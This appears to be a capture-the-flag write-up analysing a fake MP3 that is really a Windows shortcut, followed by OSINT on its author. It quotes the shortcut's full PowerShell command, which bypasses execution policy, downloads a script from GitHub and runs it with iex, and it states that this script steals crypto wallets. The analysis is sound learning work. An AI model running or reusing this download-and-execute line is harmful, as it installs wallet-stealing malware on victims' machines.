# December 1

The first day is all about OPSEC work. An MP3 converter site is used to download a zip that contain two files

`somg.mp3` and `song.mp3`. By inspecting using the `File` command we see that the suspecious file is indeed more than it claim to be:

```bash
file song.mp3
song.mp3: Audio file with ID3 version 2.3.0, contains: MPEG ADTS, layer III, v1, 192 kbps, 44.1 kHz, Stereo

file somg.mp3
somg.mp3: MS Windows shortcut, Item id list present, Points to a file or directory, Has Relative path, Has Working directory, Has command line arguments, Unicoded, MachineID win-base-2019, EnableTargetMetadata KnownFolderID 1AC14E77-02E7-4E5D-B744-2EB1AE5198B7, Archive, ctime=Sat Sep 15 06:14:14 2018, atime=Sat Sep 15 06:14:14 2018, mtime=Sat Sep 15 06:14:14 2018, length=448000, window=normal, IDListSize 0x020d, Root folder "20D04FE0-3AEA-1069-A2D8-08002B30309D", Volume "C:\", LocalBasePath "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
```

Running `exiftool` on the suspecious file shows that it attempts to run powershell:

`-ep Bypass -nop -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1','C:\ProgramData\s.ps1'); iex (Get-Content 'C:\ProgramData\s.ps1' -Raw)`

It first attempts to bypass the powershell security protocols, then download a powershell script from github. The powershell script has scans the infected host for crypto wallets and sends to a server.

By searching for a line from the powershell script on github `Created by the one and only M.M.` we find another repo (https://github.com/Bloatware-WarevilleTHM/CryptoWallet-Search).
The original creator of the script (a C++ version) also hosts the code for a dropzone written in Python (Flask) which has username, api-key and password in cleartext.
